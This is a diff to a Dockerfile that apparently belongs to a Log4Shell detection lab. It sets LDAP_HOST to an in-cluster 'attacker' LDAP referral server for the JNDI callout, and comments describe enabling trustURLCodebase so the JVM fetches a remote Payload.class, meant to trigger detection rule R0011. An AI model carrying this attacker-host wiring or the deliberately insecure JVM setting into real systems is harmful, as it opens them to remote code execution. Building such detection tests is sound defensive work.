@@ -14,6 +14,12 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 WORKDIR /app
 COPY --from=build /src/target/chain-backend-jar-with-dependencies.jar ./app.jar
 EXPOSE 8080
+# Where the malicious LDAP referral server lives — the endpoint the Log4Shell
+# JNDI lookup dials out to. Placeholder default points at the in-repo attacker
+# Service; set LDAP_HOST (host[:port]) or LDAP_URL (full ldap:// URL) to a
+# non-private/public address so the call-out egress trips R0011. Pairs with the
+# attacker image's CODEBASE_HOST (PR #144). Consumed by App.java's /api/_probe.
+ENV LDAP_HOST=attacker.attacker-ns.svc.cluster.local:1389
 # JNDI/LDAP class loading: temurin-11 sets `com.sun.jndi.ldap.object.trustURLCodebase=false`
 # by default (since JDK 11.0.1) — without this flag the Log4Shell chain stops at
 # LDAP referral, never fetches the Payload.class. Enabling it makes the JVM
